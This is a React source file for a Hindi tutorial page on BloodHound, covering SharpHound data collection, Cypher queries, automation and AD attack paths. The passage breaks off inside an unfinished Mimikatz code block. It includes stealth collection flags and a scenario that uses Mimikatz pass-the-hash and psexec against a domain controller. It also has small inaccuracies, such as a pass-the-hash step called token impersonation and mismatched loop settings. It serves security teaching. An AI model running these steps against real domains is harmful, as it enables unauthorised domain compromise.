import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Bloodhound() {
  return (
    <TutorialLayout
      title="bloodhound"
      subtitle="Active Directory अटैक पाथ मैपिंग — डोमेन एडमिन तक का shortest path"
      icon="🏹"
      prev={{ to: '/tool/mimikatz', label: 'mimikatz' }}
      next={{ to: '/tool/apktool', label: 'apktool' }}
    >
      <h2>What is BloodHound?</h2>
      <p>
        BloodHound एक शक्तिशाली Active Directory अटैक पाथ मैपिंग टूल है जो Neo4j ग्राफ़ डेटाबेस का उपयोग करके AD का पूरा मैप बनाता है। यह टूल यूज़र्स, ग्रुप्स, कंप्यूटर्स, GPOs, OUs, और उनके बीच के सभी रिलेशनशिप्स को कलेक्ट करके एक विशाल ग्राफ़ में विज़ुअलाइज़ करता है। अटैकर्स और रेड टीम्स इसका उपयोग Domain Admin तक पहुंचने का shortest path खोजने के लिए करती हैं। Blue टीम्स भी इसका उपयोग AD की कमज़ोरियों को पहचानने और ठीक करने के लिए करती हैं।
      </p>
      <p>
        BloodHound को Andy Robbins, Rohan Vazquez, और Will Schroeder ने 2016 में DEF CON 24 में प्रस्तुत किया था। ये तीनों SpecterOps कंपनी के सिक्योरिटी शोधकर्ता हैं। BloodHound ने Active Directory सिक्योरिटी टेस्टिंग को पूरी तरह बदल दिया — पहले जो काम हफ्तों में होता था, अब कुछ ही मिनटों में हो जाता है। यह ओपन सोर्स है और GitHub पर उपलब्ध है।
      </p>
      <p>
        BloodHound का मुख्य सिद्धांत यह है कि Active Directory में जितनी भी एक्सेस कंट्रोल और ग्रुप मेंबरशिप हैं, उन सबको मैनुअली ट्रैक करना लगभग असंभव है। लेकिन ग्राफ़ थ्योरी का उपयोग करके, BloodHound यह काम सेकंडों में कर देता है। यह बताता है कि कौन सा यूज़र किस कंप्यूटर पर एडमिन है, कौन सा ग्रुप किस ग्रुप का मेंबर है, और कौन सी रिलेशनशिप डोमेन एडमिन तक पहुंच बनाती है।
      </p>
      <p>
        BloodHound का इस्तेमाल सिर्फ अटैकर्स ही नहीं, बल्कि डिफेंडर्स भी करते हैं। Blue टीम्स BloodHound से AD की कमज़ोरियों को पहचानती हैं और अटैक पाथ्स को तोड़ती हैं। Purple टीम एक्सरसाइज़ में BloodHound एक essential टूल है जो दोनों तरफ से इस्तेमाल होता है। यह AD security posture assessment का industry standard बन चुका है।
      </p>
      <p>
        BloodHound Community Edition (CE) 2023 में आया जिसने पुराने Neo4j-based आर्किटेक्चर को बदल दिया। नया CE PostgreSQL और internal graph database इस्तेमाल करता है। इसमें Azure AD (Entra ID) सपोर्ट, बेहतर GUI, API access, और Docker-based deployment है। Enterprise edition भी available है जिसमें additional features हैं।
      </p>
      <p>
        BloodHound का impact security industry पर बहुत बड़ा है। OSCP, CRTP, CRTO, और OSEP जैसी certifications में BloodHound knowledge ज़रूरी है। Red team toolchains में यह standard tool बन गया है। Microsoft ने भी AD security improvements किए हैं BloodHound जैसे tools की वजह से — LAPS deployment, tiered admin model, और Kerberos improvements सब BloodHound research से inspired हैं। BloodHound आज 10,000+ GitHub stars के साथ सबसे popular AD security tool है। Internal pentests, red team engagements, और AD security audits में यह mandatory tool है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> BloodHound केवल अधिकृत Red Team ऑपरेशंस और सुरक्षा ऑडिट में ही इस्तेमाल करें। AD रेकन बिना अनुमति के अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत रेकन अपराध हो सकता है। BloodHound डेटा कलेक्शन लॉग्स में दिखाई देता है — बिना अनुमति के उपयोग न करें।
      </div>

      <h2>History of BloodHound</h2>
      <p>
        BloodHound का विकास 2016 में शुरू हुआ जब SpecterOps के शोधकर्ताओं ने महसूस किया कि Active Directory में अटैक पाथ्स खोजना एक जटिल ग्राफ़ समस्या है। उन्होंने DEF CON 24 में "Six Degrees of Domain Admin" नाम से अपना शोध प्रस्तुत किया और BloodHound टूल जारी किया। यह तुरंत लोकप्रिय हो गया।
      </p>
      <p>
        शुरुआत में BloodHound सिर्फ Linux पर चलता था, लेकिन बाद में Windows सपोर्ट भी जोड़ा गया। SharpHound डेटा कलेक्टर C# में लिखा गया ताकि Windows डोमेन में आसानी से चल सके। 2019 में BloodHound 4.0 रिलीज़ हुआ जिसमें कई नई फीचर्स जोड़ी गईं। 2023 में BloodHound Community Edition (CE) रिलीज़ हुआ जो पूरी तरह से नया आर्किटेक्चर है।
      </p>
      <p>
        BloodHound के साथ कई related tools भी आए — AzureHound (Azure AD के लिए), PlumHound (reporting के लिए), और MANSPIDER (file share enumeration के लिए)। SpecterOps ने continuously इसे update किया है। 2021 में BloodHound 4.1 आया जिसमें edge composition features और बेहतर path finding algorithms जोड़ी गईं।
      </p>
      <p>
        BloodHound का impact इतना बड़ा है कि Microsoft ने भी AD security improvements किए हैं। BloodHound ने security community को दिखाया कि AD में कितनी hidden attack paths होती हैं। आज लगभग हर internal penetration test में BloodHound इस्तेमाल होता है। OSCP, CRTP, और अन्य red team certifications में भी BloodHound knowledge ज़रूरी है।
      </p>

      <h2>How BloodHound Works?</h2>
      <p>
        BloodHound का आर्किटेक्चर तीन मुख्य कंपोनेंट्स पर आधारित है — डेटा कलेक्शन, ग्राफ़ डेटाबेस, और विज़ुअलाइज़ेशन। पहले SharpHound डोमेन से डेटा कलेक्ट करता है, फिर Neo4j में स्टोर होता है, और अंत में GUI में अटैक पाथ्स दिखाई देते हैं।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SharpHound (डेटा कलेक्टर):</strong> Windows डोमेन मेंबर मशीन से चलता है। LDAP क्वेरीज़ भेजकर यूज़र्स, ग्रुप्स, कंप्यूटर्स, सेशंस, ACLs कलेक्ट करता है। ZIP फाइल आउटपुट देता है</li>
        <li><strong className="text-white">Neo4j (ग्राफ़ डेटाबेस):</strong> सभी डेटा ग्राफ़ फॉर्मेट में स्टोर होता है। Nodes = यूज़र्स, ग्रुप्स, कंप्यूटर्स। Edges = रिलेशनशिप्स (MemberOf, AdminTo, HasSession, etc.)</li>
        <li><strong className="text-white">BloodHound GUI:</strong> Electron-based एप्लिकेशन जो ग्राफ़ विज़ुअलाइज़ करता है। प्री-बिल्ट क्वेरीज़ से एक क्लिक में अटैक पाथ्स दिखाता है</li>
        <li><strong className="text-white">Cypher Queries:</strong> Neo4j की क्वेरी लैंग्वेज जिससे कस्टम क्वेरीज़ लिखी जा सकती हैं</li>
      </ul>
      <p>
        BloodHound CE (Community Edition) में architecture बदल गया है। अब Neo4j की जगह internal graph database use होती है। PostgreSQL metadata store करता है। Docker-based deployment से installation आसान हो गई है। CE में API access भी है जिससे automated queries run कर सकते हो।
      </p>
      <p>
        SharpHound collection methods तीन तरह के हैं: Default (सब data), Stealth (कम detectable), और Loop (continuous collection)। Loop mode में SharpHound continuously session changes track करता है — यह real-time attack planning में useful है। Collection methods: Group, Session, Trusts, ACL, ObjectProps, Container, GPOLocalGroup, RDP, DCOM, PSRemote।
      </p>

      <h2>Installation</h2>
      <p>
        BloodHound इंस्टॉल करने के लिए Neo4j डेटाबेस और BloodHound GUI दोनों चाहिए। Kali Linux में यह प्री-इंस्टॉल्ड आता है। SharpHound Windows मशीन पर अलग से चलाना होता है।
      </p>
      <CodeBlock
        title="BloodHound इंस्टॉल करें"
        code={"# Kali Linux में प्री-इंस्टॉल्ड होता है:\nsudo apt update\nsudo apt install bloodhound\n\n# Neo4j इंस्टॉल करें (अगर नहीं है):\nsudo apt install neo4j\n\n# सोर्स से इंस्टॉल:\ngit clone https://github.com/BloodHoundAD/BloodHound.git\ncd BloodHound\nnpm install\nnpm run build\n\n# Docker से इंस्टॉल:\ndocker pull specterops/bloodhound\ndocker run -d -p 7474:7474 -p 7687:7687 specterops/bloodhound\n\n# SharpHound डाउनलोड करें (Windows के लिए):\n# GitHub Releases से SharpHound.exe डाउनलोड करें\n\n# Python वर्जन (BloodHound.py):\npip install bloodhound\nbloodhound-python -d target.local -u user -p password -c All"}
      />
      <CodeBlock
        title="BloodHound CE Docker Compose Install"
        code={"# BloodHound CE — recommended installation method:\n# docker-compose.yml बनाओ:\n# version: '3'\n# services:\n#   bloodhound:\n#     image: specterops/bloodhound:latest\n#     ports:\n#       - \"8080:8080\"\n#     environment:\n#       - NEO4J_URI=bolt://neo4j:7687\n#       - NEO4J_USER=neo4j\n#       - NEO4J_PASSWORD=bloodhound\n#   neo4j:\n#     image: neo4j:5\n#     ports:\n#       - \"7474:7474\"\n#       - \"7687:7687\"\n#     environment:\n#       - NEO4J_AUTH=neo4j/bloodhound\n\n# Start करो:\ndocker compose up -d\n\n# Browser में open करो:\n# http://localhost:8080\n# Default credentials: admin / admin (पहली बार change करो)\n\n# AzureHound install (Azure AD के लिए):\n# GitHub से download करो:\n# https://github.com/BloodHoundAD/AzureHound/releases"}
      />
      <CodeBlock
        title="BloodHound on Windows"
        code={"# Windows पर BloodHound CE:\n# Docker Desktop install करो पहले\n# फिर docker compose up -d चलाओ\n\n# SharpHound Windows पर:\n# PowerShell (Admin) में:\n# Import-Module .\\\\SharpHound.ps1\n# Invoke-BloodHound -CollectionMethod All\n\n# या exe version:\n# SharpHound.exe -c All\n\n# या C# version:\n# .\\\\SharpHound.exe -c All --outputdirectory C:\\\\BH\n\n# Linux से bloodhound-python:\npip install bloodhound\nbloodhound-python -d corp.local -u svc_bh -p 'Password123' -c All -ns 10.0.0.1"}
      />

      <h2>Data Collection (SharpHound)</h2>
      <p>
        SharpHound BloodHound का डेटा कलेक्टर है। यह Windows डोमेन मेंबर मशीन से चलता है और LDAP क्वेरीज़ के ज़रिए AD का पूरा डेटा कलेक्ट करता है। यह .NET में लिखा गया है और डोमेन जॉइन्ड मशीन से चलाना सबसे आसान है।
      </p>
      <CodeBlock
        title="SharpHound Data Collection"
        code={"# सभी डेटा कलेक्ट करो:\nSharpHound.exe -c All\n\n# स्पेसिफिक कलेक्शन मेथड्स:\nSharpHound.exe -c Group,Session,ACL\n\n# लूप मोड — कंटीन्यूअस कलेक्शन (2 घंटे):\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# हर 10 मिनट में:\nSharpHound.exe -c All --loop --loopduration 01:00:00 --loopsession 10\n\n# डोमेन स्पेसिफाई करें:\nSharpHound.exe -c All -d target.local\n\n# आउटपुट डायरेक्ट्री:\nSharpHound.exe -c All --outputdirectory C:\\\\temp\n\n# स्टील्थ मोड (कम डिटेक्शन):\nSharpHound.exe -c All --stealth\n\n# थर्ड पार्टी सर्वर से कलेक्ट:\nSharpHound.exe -c All --domaincontroller dc01.target.local\n\n# ZIP फाइल जनरेट होगी — उसे BloodHound में इम्पोर्ट करो"}
      />

      <h2>Important Options Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c All</td><td className="py-2 px-3">सभी डेटा कलेक्ट करें (सबसे कंप्लीट)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Group</td><td className="py-2 px-3">ग्रुप मेंबरशिप कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Session</td><td className="py-2 px-3">एक्टिव लॉगिन सेशंस कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c ACL</td><td className="py-2 px-3">एक्सेस कंट्रोल लिस्ट्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Trusts</td><td className="py-2 px-3">डोमेन ट्रस्ट्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c GPOLocalGroup</td><td className="py-2 px-3">GPO लोकल ग्रुप पॉलिसी कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c ObjectProps</td><td className="py-2 px-3">ऑब्जेक्ट प्रॉपर्टीज़ कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c LoggedOn</td><td className="py-2 px-3">लॉग्ड-ऑन यूज़र्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--stealth</td><td className="py-2 px-3">स्टील्थ मोड — कम डिटेक्शन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--loop</td><td className="py-2 px-3">कंटीन्यूअस कलेक्शन मोड</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">स्पेसिफिक डोमेन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--outputdirectory</td><td className="py-2 px-3">आउटपुट डायरेक्ट्री</td></tr>
          </tbody>
        </table>
      </div>

      <h2>BloodHound Setup</h2>
      <p>
        BloodHound GUI शुरू करने से पहले Neo4j डेटाबेस चालू होना चाहिए। Neo4j ग्राफ़ डेटाबेस है जो सारा AD डेटा स्टोर करता है।
      </p>
      <CodeBlock
        title="Neo4j और BloodHound शुरू करें"
        code={"# स्टेप 1: Neo4j शुरू करें:\nsudo neo4j console\n\n# अगर सर्विस के तौर पर चलाना है:\nsudo systemctl start neo4j\n\n# स्टेप 2: ब्राउज़र में Neo4j खोलें:\n# http://localhost:7474\n# डिफ़ॉल्ट लॉगिन: neo4j / neo4j\n# पासवर्ड बदलो (ज़रूरी है!)\n\n# स्टेप 3: BloodHound शुरू करें:\nbloodhound\n\n# या डायरेक्ट:\n# /usr/share/bloodhound/BloodHound-linux-x64/BloodHound\n\n# स्टेप 4: Neo4j क्रेडेंशियल्स से लॉगिन करो\n# SharpHound की ZIP फाइल ड्रैग & ड्रॉप करो\n# डेटा इम्पोर्ट हो जाएगा"}
      />

      <h2>Pre-Built Queries</h2>
      <p>
        BloodHound GUI में Analysis टैब में प्री-बिल्ट क्वेरीज़ हैं जो एक क्लिक में अटैक पाथ्स दिखाती हैं। ये क्वेरीज़ ग्राफ़ थ्योरी का उपयोग करके shortest path खोजती हैं।
      </p>
      <CodeBlock
        title="Built-in Queries"
        code={`# BloodHound GUI में Analysis टैब:

# SHORTCUTS TO DOMAIN ADMIN:
# "Find all Domain Admins" — Domain Admins की लिस्ट
# "Find Shortest Paths to Domain Admin" — अटैक पाथ्स
# "Find Shortest Paths to Domain Admin from Kerberoastable Users"
# "Find Shortest Paths from Kerberoastable Users"

# PRINCIPALS WITH RIGHTS:
# "Find Principals with DCSync Rights" — DCSync capable यूज़र्स
# "Find All Kerberoastable Users" — Kerberoast टार्गेट्स
# "Find AS-REP Roastable Users" — AS-REP टार्गेट्स
# "Find Principals with Foreign Domain Group Membership"

# COMPUTER TARGETS:
# "Find Computers with Unsupported Windows OS"
# "Find Computers where Domain Users are Local Admin"
# "Find Computers where Domain Users can RDP"

# ग्रुप क्वेरीज़:
# "Find All Groups with WriteDACL"
# "Find All Groups with GenericAll"
# "Find Groups with Foreign Domain Membership"

# हर क्वेरी एक ग्राफ़ दिखाती है nodes और edges के साथ
# Nodes = यूज़र्स, ग्रुप्स, कंप्यूटर्स
# Edges = रिलेशनशिप्स (MemberOf, AdminTo, etc.)

# AZURE AD QUERIES (CE):
# "Find Azure Global Admins"
# "Find Azure VM Admin Login Users"
# "Find Hybrid Paths to Azure"

# CERTIFICATE QUERIES (CE):
# "Find ADCS ESC1 Vulnerable Templates"
# "Find ADCS ESC9a Vulnerable Templates"

# TRUST QUERIES:
# "Find All Trust Relationships"
# "Find Cross-forest Attack Paths"

# DELEGATION QUERIES:
# "Find Computers with Unconstrained Delegation"
# "Find Computers with Constrained Delegation"

# OWNERSHIP QUERIES:
# "Find All Objects Owned by Users"
# "Find Principals with Ownership"`}
      />

      <h2>Attack Paths (Step-by-Step)</h2>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'Data Collect', desc: 'SharpHound से डोमेन का डेटा कलेक्ट करो — यूज़र्स, ग्रुप्स, सेशंस, ACLs, Trusts' },
          { step: '2', title: 'Import', desc: 'BloodHound GUI में ZIP फाइल इम्पोर्ट करो — Neo4j ग्राफ़ डेटाबेस में स्टोर होगा' },
          { step: '3', title: 'Query', desc: 'प्री-बिल्ट क्वेरीज़ से अटैक पाथ्स ढूंढो — shortest path to Domain Admin' },
          { step: '4', title: 'Analyze', desc: 'हर node और edge को समझो — कौन सा यूज़र कहाँ एडमिन है' },
          { step: '5', title: 'Exploit', desc: 'अटैक पाथ फॉलो करो — हर node पर एक्सप्लॉइट टेक्निक अप्लाई करो' },
          { step: '6', title: 'Document', desc: 'सभी फाइंडिंग्स डॉक्यूमेंट करो — रिपोर्ट में अटैक पाथ दिखाओ' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>

      <h2 className="mt-8">Key Relationships Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Edge</th>
              <th className="text-left py-2 px-3 text-neon-green">मतलब</th>
              <th className="text-left py-2 px-3 text-neon-green">एक्सप्लॉइट</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MemberOf</td><td className="py-2 px-3">ग्रुप मेंबरशिप</td><td className="py-2 px-3">ग्रुप पॉलिसी एब्यूज</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AdminTo</td><td className="py-2 px-3">लोकल एडमिन एक्सेस</td><td className="py-2 px-3">लैटरल मूवमेंट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HasSession</td><td className="py-2 px-3">एक्टिव लॉगिन सेशन</td><td className="py-2 px-3">टोकन इम्पर्सनेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CanRDP</td><td className="py-2 px-3">RDP एक्सेस</td><td className="py-2 px-3">रिमोट डेस्कटॉप</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DCSync</td><td className="py-2 px-3">DCSync राइट्स</td><td className="py-2 px-3">हैश डंप (Mimikatz)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ForceChangePassword</td><td className="py-2 px-3">पासवर्ड बदलने का अधिकार</td><td className="py-2 px-3">एडमिन पासवर्ड रीसेट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">GenericAll</td><td className="py-2 px-3">पूरा कंट्रोल</td><td className="py-2 px-3">SPN सेट करो, पासवर्ड रीसेट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">WriteDacl</td><td className="py-2 px-3">DACL में बदलाव</td><td className="py-2 px-3">अपने आप को एडमिन बनाओ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AddMember</td><td className="py-2 px-3">ग्रुप में मेंबर जोड़ना</td><td className="py-2 px-3">ग्रुप में खुद को जोड़ो</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AllowedToDelegate</td><td className="py-2 px-3">डेलिगेशन राइट्स</td><td className="py-2 px-3">कॉन्स्ट्रेंड डेलिगेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HasSIDHistory</td><td className="py-2 px-3">SID हिस्ट्री</td><td className="py-2 px-3">SID हिस्ट्री इंजेक्शन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GPLink</td><td className="py-2 px-3">GPO लिंक</td><td className="py-2 px-3">GPO मैनिपुलेशन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Owns</td><td className="py-2 px-3">ऑब्जेक्ट ओनरशिप</td><td className="py-2 px-3">ACL मैनिपुलेशन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GetChanges</td><td className="py-2 px-3">DCSync पार्ट 1</td><td className="py-2 px-3">पासवर्ड हैश एक्सट्रैक्ट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GetChangesAll</td><td className="py-2 px-3">DCSync पार्ट 2</td><td className="py-2 px-3">सभी हैशेस डंप</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">AllowedToAct</td><td className="py-2 px-3">रिसोर्स-बेस्ड कॉन्स्ट्रेंड डेलिगेशन</td><td className="py-2 px-3">S4U अटैक</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">SQLAdmin</td><td className="py-2 px-3">SQL Server एडमिन</td><td className="py-2 px-3">xp_cmdshell</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">HasSIDHistory</td><td className="py-2 px-3">SID हिस्ट्री</td><td className="py-2 px-3">SID हिस्ट्री इंजेक्शन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Contains</td><td className="py-2 px-3">OU कंटेनमेंट</td><td className="py-2 px-3">GPO स्कोपिंग</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GpLink</td><td className="py-2 px-3">GPO लिंक</td><td className="py-2 px-3">GPO एनफोर्समेंट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">TrustedBy</td><td className="py-2 px-3">ट्रस्ट रिलेशनशिप</td><td className="py-2 px-3">क्रॉस-डोमेन अटैक</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Custom Cypher Queries</h2>
      <p>
        BloodHound GUI में Cypher टैब में कस्टम क्वेरीज़ लिख सकते हो। Neo4j की क्वेरी लैंग्वेज बहुत पावरफुल है। ये कुछ उपयोगी क्वेरीज़ हैं:
      </p>
      <CodeBlock
        title="Cypher Queries"
        code={"// सभी Domain Admins ढूंढो:\nMATCH (g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"})\nMATCH (n)-[:MemberOf*1..]->(g)\nRETURN n.name, n.enabled\n\n// कौन सा यूज़र किस कंप्यूटर पर एडमिन है:\nMATCH p=shortestPath((u:User)-[:AdminTo*1..]->(c:Computer))\nRETURN u.name, c.name, length(p)\n\n// Kerberoastable यूज़र्स:\nMATCH (u:User {hasspn:true})\nWHERE NOT u.name STARTS WITH \"KRBTGT\"\nRETURN u.name, u.serviceprincipalnames\n\n// AS-REP रोस्टेबल यूज़र्स:\nMATCH (u:User {dontreqpreauth:true})\nRETURN u.name\n\n// DCSync राइट्स वाले:\nMATCH p=shortestPath((n)-[:GetChanges|GetChangesAll*1..]->(d:Domain))\nRETURN n.name\n\n// सभी फॉरेन ग्रुप मेंबर्स:\nMATCH (n)-[:MemberOf]->(g:Domain {name: \"OTHERDOMAIN.LOCAL\"})\nRETURN n.name, g.name\n\n// सबसे छोटा पाथ Domain Admin तक:\nMATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf*1..]->(g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"}))\nRETURN p\n\n// सभी कंप्यूटर्स जहाँ Domain Users एडमिन हैं:\nMATCH (g:Group {name:\"DOMAIN USERS@TARGET.LOCAL\"})\nMATCH (g)-[:AdminTo]->(c:Computer)\nRETURN c.name"}
      />

      <h2>BloodHound CE (Community Edition)</h2>
      <p>
        2023 में SpecterOps ने BloodHound Community Edition (CE) रिलीज़ किया। यह पूरी तरह से नया आर्किटेक्चर है — अब Neo4j की जगह PostgreSQL और graph database इंटरनली इस्तेमाल होता है। Docker-based डिप्लॉयमेंट है और बहुत बेहतर परफॉर्मेंस देता है।
      </p>
      <p>
        CE और legacy BloodHound में सबसे बड़ा फ़र्क backend architecture है। Legacy version में Neo4j + Electron GUI था जो memory-intensive था। CE में PostgreSQL + Go backend है जो lightweight और faster है। CE में Azure AD (Entra ID) support built-in है — hybrid environments में on-premises और cloud दोनों map होते हैं। CE API-first design है — GUI भी API पर built है, इसलिए automation आसान है।
      </p>
      <p>
        CE में new edge types भी हैं — ADCSESC1, ADCSESC9a, WriteGPLink, SyncedToEntraUser जैसे edges AD Certificate Services और Azure AD attacks cover करते हैं। Edge composition feature से multiple edges combine करके complex attack paths दिखती हैं। CE recommended है सभी new deployments के लिए।
      </p>
      <CodeBlock
        title="BloodHound CE Install"
        code={"# Docker Compose से इंस्टॉल:\ngit clone https://github.com/SpecterOps/BloodHound.git\ncd BloodHound\ndocker compose up -d\n\n# डिफ़ॉल्ट लॉगिन:\n# URL: http://localhost:8080\n# Admin: admin\n# पासवर्ड: डिफ़ॉल्ट पासवर्ड चेंज करो\n\n# नए SharpHound CE का उपयोग:\n# GitHub Releases से SharpHound CE डाउनलोड करो\nSharpHound.exe -c All\n\n# या BloodHound.py:\npip install bloodhound\nbloodhound-python -d target.local -u user -p password -c All\n\n# नए फीचर्स:\n# - बेहतर परफॉर्मेंस\n# - Azure AD सपोर्ट\n# - नई एज टाइप्स\n# - बेहतर GUI\n# - API सपोर्ट"}
      />

      <h2>Scripting & Automation</h2>
      <p>
        BloodHound को स्क्रिप्ट्स से ऑटोमेट कर सकते हो। SharpHound को शेड्यूल करो, क्वेरीज़ ऑटोमेट करो, और रिपोर्ट्स जनरेट करो।
      </p>
      <CodeBlock
        title="Automation Scripts"
        code={"# SharpHound ऑटोमेशन (Windows PowerShell):\n# डेली स्कैन शेड्यूल करो:\n$task = New-ScheduledTaskTrigger -Daily -At \"2:00AM\"\nRegister-ScheduledTask -Trigger $task -User \"DOMAIN\\\\svc_bloodhound\" -TaskName \"BH-Scan\" -Action (New-ScheduledTaskAction -Execute \"C:\\\\Tools\\\\SharpHound.exe\" -Argument \"-c All --outputdirectory C:\\\\BH\\\\Data\")\n\n# Linux से Python ऑटोमेशन:\n# bloodhound-python इंस्टॉल:\npip install bloodhound\n\n# ऑटोमेटिक कलेक्शन:\nbloodhound-python -d target.local -u svc_bloodhound -p 'Password123' -c All -ns 10.0.0.1\n\n# Neo4j Cypher कमांड लाइन से:\necho \"MATCH (n) RETURN count(n)\" | cypher-shell -u neo4j -p password\n\n# Neo4j डेटाबेस क्लियर करो:\necho \"MATCH (n) DETACH DELETE n\" | cypher-shell -u neo4j -p password\n\n# रिपोर्ट जनरेशन (bloodhound-cli):\n# CE वर्जन में API से रिपोर्ट जनरेट करो"}
      />
      <CodeBlock
        title="Bulk Cypher Query Runner"
        code={"# एक साथ कई क्वेरीज़ चलाओ और CSV में सेव करो:\n# queries.cypher फाइल बनाओ:\n# MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames\n# MATCH (u:User {dontreqpreauth:true}) RETURN u.name\n# MATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name\n\n# Cypher queries रन करो:\ncat queries.cypher | cypher-shell -u neo4j -p password --format plain > results.txt\n\n# Python से automated reporting:\npython3 -c \"\nfrom neo4j import GraphDatabase\ndriver = GraphDatabase.driver('bolt://localhost:7687', auth=('neo4j','password'))\nwith driver.session() as session:\n    result = session.run('MATCH (u:User {hasspn:true}) RETURN u.name')\n    for record in result:\n        print(record['u.name'])\ndriver.close()\n\""}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        BloodHound real-world penetration tests और red team engagements में बहुत effectively इस्तेमाल होता है। यहाँ कुछ common scenarios हैं जहाँ BloodHound critical findings निकालता है।
      </p>
      <p>
        एक typical internal pentest में, tester को domain-joined machine मिलती है। SharpHound चलाने के बाद BloodHound दिखाता है कि Domain Admin group का कौन सा member किसी workstation पर logged in है। उस workstation पर local admin access मिलते ही, tester उस user का token impersonate करके Domain Admin बन जाता है। यह attack path manually खोजना लगभग असंभव है।
      </p>
      <p>
        एक और common scenario है — Kerberoastable service accounts। BloodHound दिखाता है कि कौन से user accounts के SPN set हैं। इन accounts के TGS hashes crack करके, attacker को service account का password मिल जाता है। अगर वह service account Domain Admin है (जो अक्सर होता है), तो domain compromise हो जाता है। BloodHound यह पूरा path visually दिखाता है।
      </p>
      <CodeBlock
        title="Common Attack Scenario"
        code={"# स्टेप 1: डोमेन मेंबर मशीन से SharpHound चलाओ\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# स्टेप 2: BloodHound में इम्पोर्ट करो\n# ZIP फाइल drag & drop करो\n\n# स्टेप 3: \"Find Shortest Paths to Domain Admin\" क्वेरी चलाओ\n# अटैक पाथ दिखेगा:\n# User A -> AdminTo -> Workstation1 -> HasSession -> DomainAdmin\n\n# स्टेप 4: Mimikatz से token impersonate करो\n# Workstation1 पर:\nsekurlsa::pth /user:DomainAdmin /domain:target.local /ntlm:hash\n\n# स्टेप 5: Domain Admin access मिल गया!\n# psexec से DC पर access:\npsexec \\\\\\\\dc01.target.local cmd.exe"}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        BloodHound अकेले इस्तेमाल करने से ज़्यादा, दूसरे tools के combination में powerful है। Red team toolchains में BloodHound reconnaissance का starting point है।
      </p>
      <CodeBlock
        title="BloodHound + Mimikatz Combo"
